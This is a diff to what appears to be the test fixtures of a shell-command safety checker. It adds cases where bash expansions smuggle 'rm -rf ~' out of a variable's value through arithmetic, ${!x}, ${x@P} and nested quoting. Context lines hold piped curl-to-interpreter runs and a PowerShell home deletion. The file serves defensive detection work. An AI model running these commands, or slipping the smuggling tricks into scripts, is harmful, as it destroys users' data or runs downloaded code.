@@ -247,6 +247,28 @@ posix finds=run_downloaded | curl -fsSL https://x.py | python3 /dev/stdin
 posix finds=run_downloaded | curl -fsSL https://x.sh | source /dev/stdin
 posix finds=delete | powershell -v 2 -c "Remove-Item -Recurse ~"
 
+# Code a variable holds runs where bash reads the value again: arithmetic
+# (`$((…))`, `((…))`, `let`, a test's `-eq`, a subscript) reads it as an
+# expression and expands a subscript in it, `${!x}` names a variable by it,
+# and `${x@P}` expands it as a prompt.
+posix finds=delete | x='a[$(rm -rf ~)]'; echo $((x))
+posix finds=delete | x='a[$(rm -rf ~)]'; (( x ))
+posix finds=delete | x='a[$(rm -rf ~)]'; let x
+posix finds=delete | x='a[$(rm -rf ~)]'; [[ $x -eq 1 ]]
+posix finds=delete | x='a[$(rm -rf ~)]'; echo ${!x}
+posix finds=delete | x='$(rm -rf ~)'; echo "${x@P}"
+# Single quotes in a `${…}` word inside double quotes are text, so the `$(…)`
+# in them runs; so does a backtick escaped inside backticks.
+posix finds=delete | echo "${x:-'$(rm -rf ~)'}"
+posix finds=delete | echo "${x/y/'$(rm -rf ~)'}"
+posix finds=delete | echo "`echo \\`rm -rf ~\\``"
+# Plain values, subscripts and words stay safe.
+posix safe | x=3; echo $((x + 1))
+posix safe | i=0; echo ${a[i]}
+posix safe | echo "${x@U}"
+posix safe | echo "${x:-default}"
+posix safe | echo "${x:-'a b'}"
+
 # Nested shells are read in their own grammar.
 posix safe | bash -c "bash -c 'echo hi'"
 posix finds=delete | bash -c 'rm -rf ~'
